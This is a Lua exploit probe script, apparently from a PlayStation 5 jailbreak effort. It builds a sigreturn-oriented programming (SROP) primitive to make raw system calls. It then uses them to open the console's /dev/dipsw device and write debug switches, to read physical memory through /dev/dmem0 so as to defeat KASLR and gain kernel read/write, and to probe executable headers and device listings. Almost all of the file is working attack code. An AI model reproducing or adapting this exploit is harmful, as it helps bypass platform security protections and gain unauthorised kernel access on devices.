-- CRASH_CLASS: HIGH
-- PROBE 132a: Exploit /dev/dipsw + /dev/dmem0 via SROP
--
-- /dev/dipsw: PS5 debug DIP switches. Reading returns current flags.
-- Writing could enable debug mode → debug settings menu!
--
-- /dev/dmem0: Direct memory device. If we can read at physical offsets,
-- we get kernel memory access → KASLR defeat + kernel R/W.

print("=== PROBE 132a: DIPSW + DMEM EXPLOIT ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x8000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local P = gpu
local B = gpu + 0x100
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end

--------------------------------------------------------------------
-- SECTION A: Read /dev/dipsw
--------------------------------------------------------------------
print("")
print("--- [A] /dev/dipsw ---")
ws(P, "/dev/dipsw")
local fd_dipsw = to_num(srop(5, P, uint64(0)))  -- O_RDONLY
print("[A] dipsw fd=" .. fd_dipsw)

if fd_dipsw > 0 and fd_dipsw < 256 then
    -- Read current DIP switch values
    memory.write_qword(B, uint64(0))
    memory.write_qword(B+8, uint64(0))
    memory.write_qword(B+0x10, uint64(0))
    memory.write_qword(B+0x18, uint64(0))
    local rv_rd = srop(3, uint64(fd_dipsw), B, uint64(32))
    print("[A] read(32)=" .. hex(rv_rd))
    local rdh, rdl = get_hi_lo(rv_rd)
    if rdl > 0 and rdl < 256 then
        print("[A] *** DIPSW READ " .. rdl .. " bytes! ***")
        for off = 0, math.min(rdl, 32) - 4, 4 do
            print(string.format("  +0x%02X: 0x%08X", off, to_num(memory.read_dword(B + off))))
        end
    end
    srop(6, uint64(fd_dipsw))

    -- Try ioctl on dipsw
    ws(P, "/dev/dipsw")
    fd_dipsw = to_num(srop(5, P, uint64(2)))  -- O_RDWR
    print("[A] dipsw O_RDWR fd=" .. fd_dipsw)
    if fd_dipsw > 0 and fd_dipsw < 256 then
        -- On PS4, ioctl 0x40048806 reads dipsw, 0x40048807 writes
        memory.write_dword(B, 0)
        local rv_io1 = srop(54, uint64(fd_dipsw), uint64(0x40048806), B)
        print("[A] ioctl(read 0x40048806)=" .. hex(rv_io1) .. " val=" .. to_num(memory.read_dword(B)))

        memory.write_dword(B, 0)
        local rv_io2 = srop(54, uint64(fd_dipsw), uint64(0x40048807), B)
        print("[A] ioctl(write 0x40048807)=" .. hex(rv_io2))

        -- Try reading individual switches 0-31
        print("[A] switch values:")
        for sw = 0, 15 do
            memory.write_dword(B, sw)
            local rv_sw = srop(54, uint64(fd_dipsw), uint64(0x40048806), B)
            local swh, swl = get_hi_lo(rv_sw)
            local val = to_num(memory.read_dword(B))
            if swl == 0 and swh == 0 then
                print(string.format("  sw[%d]=%d", sw, val))
            end
        end
        srop(6, uint64(fd_dipsw))
    end
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION B: Read /dev/dmem0
--------------------------------------------------------------------
print("")
print("--- [B] /dev/dmem0 ---")
ws(P, "/dev/dmem0")
local fd_dm = to_num(srop(5, P, uint64(2)))  -- O_RDWR
print("[B] dmem0 fd=" .. fd_dm)

if fd_dm > 0 and fd_dm < 256 then
    -- Try pread at offset 0 (physical addr 0)
    memory.write_qword(B, uint64(0xDEADBEEF))
    local rv_pr = srop(475, uint64(fd_dm), B, uint64(64))
    print("[B] pread(64,off=0)=" .. hex(rv_pr))
    local prh, prl = get_hi_lo(rv_pr)
    if prl > 0 and prl < 256 then
        print("[B] *** DMEM0 READ " .. prl .. " bytes! ***")
        for off = 0, math.min(prl, 64) - 4, 8 do
            print(string.format("  phys+0x%02X: %s", off, hex(memory.read_qword(B + off))))
        end
    end

    -- Try read at various physical offsets via lseek+read
    local test_offsets = {0, 0x1000, 0x100000, 0x1000000}
    for _, off in ipairs(test_offsets) do
        -- lseek(fd, offset, SEEK_SET=0)
        local rv_ls = srop(478, uint64(fd_dm), uint64(off), uint64(0))
        memory.write_qword(B, uint64(0))
        local rv_r = srop(3, uint64(fd_dm), B, uint64(8))
        local rrh, rrl = get_hi_lo(rv_r)
        if rrl > 0 and rrl < 256 then
            print(string.format("[B] phys 0x%X: %s", off, hex(memory.read_qword(B))))
        else
            print(string.format("[B] phys 0x%X: read failed rv=%s", off, hex(rv_r)))
        end
    end

    -- Try ioctl on dmem0
    memory.write_qword(B, uint64(0))
    memory.write_qword(B+8, uint64(0))
    local rv_io = srop(54, uint64(fd_dm), uint64(0x40104400), B)
    print("[B] ioctl(0x40104400)=" .. hex(rv_io))

    srop(6, uint64(fd_dm))
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION C: Read /app0/eboot.bin header
--------------------------------------------------------------------
print("")
print("--- [C] /app0/eboot.bin ---")
ws(P, "/app0/eboot.bin")
local fd_eb = to_num(srop(5, P, uint64(0)))
print("[C] eboot.bin fd=" .. fd_eb)

if fd_eb > 0 and fd_eb < 256 then
    memory.write_qword(B, uint64(0))
    memory.write_qword(B+8, uint64(0))
    memory.write_qword(B+0x10, uint64(0))
    memory.write_qword(B+0x18, uint64(0))
    local rv_r = srop(3, uint64(fd_eb), B, uint64(32))
    print("[C] read(32)=" .. hex(rv_r))
    local rrh, rrl = get_hi_lo(rv_r)
    if rrl > 0 then
        print("[C] header: " .. hex(memory.read_qword(B)) .. " " .. hex(memory.read_qword(B+8)))
        print("[C]         " .. hex(memory.read_qword(B+0x10)) .. " " .. hex(memory.read_qword(B+0x18)))
        -- Check for ELF magic
        local m = to_num(memory.read_dword(B))
        if m == 0x464C457F then
            print("[C] *** ELF MAGIC! Valid executable! ***")
        elseif m == 0x00454353 then
            print("[C] *** SCE header (encrypted)! ***")
        end
    end
    srop(6, uint64(fd_eb))
end
print("[C] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- SECTION D: Continue /dev listing (more entries)
--------------------------------------------------------------------
print("")
print("--- [D] more /dev entries ---")
ws(P, "/dev")
local fd_dev = to_num(srop(5, P, uint64(0)))
if fd_dev > 0 and fd_dev < 256 then
    -- First read to skip past entries we already saw
    memory.write_qword(B, uint64(0))
    local rv1 = srop(272, uint64(fd_dev), B, uint64(0x2000))
    -- Second read for more entries
    local rv2 = srop(272, uint64(fd_dev), B, uint64(0x2000))
    local rr2h, rr2l = get_hi_lo(rv2)
    print("[D] getdirentries batch 2: rv=" .. hex(rv2))
    if rr2l > 0 and rr2l < 0x2000 then
        local pos = 0
        local cnt = 0
        while pos < rr2l and cnt < 30 do
            local d4 = to_num(memory.read_dword(B + pos + 4))
            if d4 == 0 then break end
            local reclen = d4 % 65536
            local namlen = math.floor(d4 / 16777216)
            if reclen == 0 then break end
            local name = ""
            for i = 0, math.min(namlen, 30) - 1 do
                local b = to_num(memory.read_byte(B + pos + 8 + i))
                if b >= 32 and b < 127 then name = name .. string.char(b) end
            end
            if #name > 0 then print("  /dev/" .. name) end
            pos = pos + reclen
            cnt = cnt + 1
        end
    else
        print("[D] no more entries")
    end
    srop(6, uint64(fd_dev))
end

print("")
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
